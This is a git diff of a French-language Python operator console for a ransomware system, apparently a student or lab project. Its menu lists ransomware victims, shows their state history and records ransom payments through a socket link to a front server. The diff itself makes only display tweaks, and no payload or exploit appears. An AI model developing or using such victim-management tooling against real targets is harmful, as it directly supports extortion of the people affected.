@@ -11,6 +11,7 @@ import socket
 from utile import security
 import utile.configgetter as config
 from utile import message
+import json
 
 def main():
     """ Console de contrôle """
@@ -18,13 +19,6 @@ def main():
 
     # Initialisation de la sécurité
     sec = security.SecurityLayer();
-
-    print('CONSOLE DE CONTRÔLE'
-          '\n==================='
-          '\n1) Liste des victimes du ransomware'
-          '\n2) Historique des états d''une victime'
-          '\n3) Renseigner le paiement de rançon d''une victime'
-          '\n4) Quitter')
     # Création de la socket de connexion
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # On se connecte
@@ -38,7 +32,14 @@ def main():
     print('$ Server : ' + str(get_keys))
     while choix != '4':
         # On demande un choix plus cohérent basé sur le menu plus haut
+        print('CONSOLE DE CONTRÔLE'
+              '\n==================='
+              '\n1) Liste des victimes du ransomware'
+              '\n2) Historique des états d''une victime'
+              '\n3) Renseigner le paiement de rançon d' 'une victime'
+              '\n4) Quitter')
         choix = input('Votre choix : ')
+        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         if choix == '1':
             hasAsked = True
             # On demande au serveur frontale de lister les victimes
@@ -46,9 +47,9 @@ def main():
             d = message.list_victim_req()
             s.send(bytes(d, 'utf-8'))
             # On récupère la réponse en écoutant
-            data = s.recv(2048)
-            # Et on l'envoie...
-            print('$ Server : ' + str(data))
+            data = s.recv(2048).decode()
+            print('LISTING DES VICTIMES DU RANSOMWARE\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+            print(str(data))
         elif choix == '2':
             if hasAsked:
                 # On demande au serveur frontale l'historique d'une victime
